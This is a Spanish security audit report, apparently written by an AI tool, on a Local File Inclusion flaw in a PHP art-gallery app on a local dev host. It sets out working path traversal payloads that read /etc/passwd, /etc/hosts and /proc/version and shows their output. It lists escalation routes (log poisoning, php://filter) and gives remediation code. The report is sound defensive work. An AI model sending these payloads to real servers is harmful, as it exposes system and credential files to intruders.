# Informe de Auditoría de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:16:59 UTC  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** GitHub Copilot CLI  

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor sin autenticación.

---

## Descripción de la Aplicación

- **Nombre:** Galería de Arte Virtual
- **Tecnología:** PHP
- **Endpoint vulnerable:** `/gallery.php`
- **Parámetro vulnerable:** `page`

La aplicación presenta un menú con secciones (Arte Moderno, Arte Clásico, Arte Abstracto, Acerca de) accesibles mediante el parámetro `page` en la URL:

```
http://web.dev.local:8081/gallery.php?page=modern
http://web.dev.local:8081/gallery.php?page=classic
```

---

## Vulnerabilidad Detectada

### CVE/Tipo: Local File Inclusion (LFI)

**Severidad:** 🔴 CRÍTICA  
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Descripción

El parámetro `page` en `gallery.php` es pasado directamente a una función de inclusión de archivos PHP (como `include()` o `require()`) sin validación ni sanitización adecuada. Esto permite a un atacante utilizar secuencias de path traversal (`../`) para acceder a archivos fuera del directorio raíz de la aplicación.

### Vector de Ataque

```
http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
```

---

## Explotación

### Prueba 1: Lectura de `/etc/passwd`

**Payload:**
```
GET /gallery.php?page=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** ✅ Exitoso - Contenido del archivo expuesto:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Prueba 2: Lectura de `/etc/hosts`

**Payload:**
```
GET /gallery.php?page=../../../../etc/hosts HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** ✅ Exitoso - Se confirmó que el servidor está en un contenedor Docker (`172.19.0.2`).

### Prueba 3: Lectura de `/proc/version`

**Payload:**
```
GET /gallery.php?page=../../../../proc/version HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** ✅ Exitoso - Información del kernel expuesta:

```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

---

## Impacto

| Aspecto | Detalle |
|---------|---------|
| **Confidencialidad** | Alta - Lectura de archivos del sistema sin restricción |
| **Integridad** | Media - Posible escalada a RCE (Log Poisoning, PHP wrappers) |
| **Disponibilidad** | Baja - No afecta directamente la disponibilidad |

### Información sensible expuesta:
- Lista de usuarios del sistema (`/etc/passwd`)
- Configuración de red (`/etc/hosts`)
- Versión exacta del kernel y sistema operativo (`/proc/version`)
- Potencial acceso a archivos de configuración con credenciales

### Posibles vectores de escalada:
1. **Log Poisoning:** Inyectar código PHP en logs del servidor y luego incluirlos vía LFI
2. **PHP Wrappers:** Usar `php://filter` para leer código fuente PHP en base64
3. **Lectura de archivos de configuración:** `.env`, `config.php`, `database.php`, etc.

---

## Recomendaciones de Remediación

### 1. Validación mediante lista blanca (Whitelist)
```php
// CORRECTO: Usar lista blanca de páginas permitidas
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // valor por defecto
}

include("pages/" . $page . ".php");
```

### 2. Eliminar inclusión dinámica de archivos
Evitar el uso de `include()` o `require()` con parámetros controlados por el usuario. Usar estructuras de control explícitas:

```php
switch ($_GET['page']) {
    case 'modern':   include 'pages/modern.php'; break;
    case 'classic':  include 'pages/classic.php'; break;
    case 'abstract': include 'pages/abstract.php'; break;
    case 'about':    include 'pages/about.php'; break;
    default:         include 'pages/modern.php';
}
```

### 3. Configuración de PHP
Establecer en `php.ini`:
```ini
open_basedir = /var/www/html
allow_url_include = Off
allow_url_fopen = Off
```

### 4. Sanitización de entrada (medida adicional)
```php
// Eliminar secuencias de path traversal
$page = str_replace(['../', './', '..\\', '.\\', '/'], '', $_GET['page']);
$page = basename($page); // Solo nombre de archivo
```

---

## Conclusión

La vulnerabilidad LFI encontrada en `gallery.php?page=` es **crítica** y permite la lectura de archivos arbitrarios del servidor. Ha sido explotada exitosamente para obtener el contenido de `/etc/passwd`, `/etc/hosts` y `/proc/version`. Se recomienda remediación inmediata mediante el uso de listas blancas para los valores del parámetro `page`.

---

*Informe generado automáticamente por análisis de seguridad - 2026-04-30*
